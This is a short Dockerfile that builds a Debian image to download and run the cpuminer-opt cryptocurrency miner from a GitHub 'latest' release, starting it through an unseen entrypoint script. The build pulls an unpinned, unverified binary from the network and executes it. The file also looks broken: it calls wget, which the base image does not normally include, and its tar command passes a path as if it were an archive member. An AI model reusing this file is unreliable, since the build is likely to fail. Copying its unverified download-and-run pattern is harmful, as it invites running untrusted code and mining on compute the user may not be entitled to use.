FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz

RUN tar xf cpuminer-opt-linux.tar.gz /cpuminer
ADD entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
CMD /entrypoint.sh
